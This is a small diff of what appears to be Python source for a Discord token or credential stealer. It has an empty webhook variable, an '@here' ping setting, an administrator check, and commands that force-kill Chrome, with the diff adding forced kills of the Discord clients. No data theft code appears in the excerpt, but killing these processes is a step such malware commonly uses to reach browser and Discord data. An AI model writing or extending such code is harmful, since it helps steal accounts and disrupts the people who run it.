@@ -27,6 +27,8 @@ types = "@here"
 h00k = ""
 
 os.system("TASKKILL /F /IM chrome.exe")
+os.system("TASKKILL /F /IM Discord.exe")
+os.system("TASKKILL /F /IM DiscordPTB.exe")
 os.system("cls") 
 
 def is_admin():
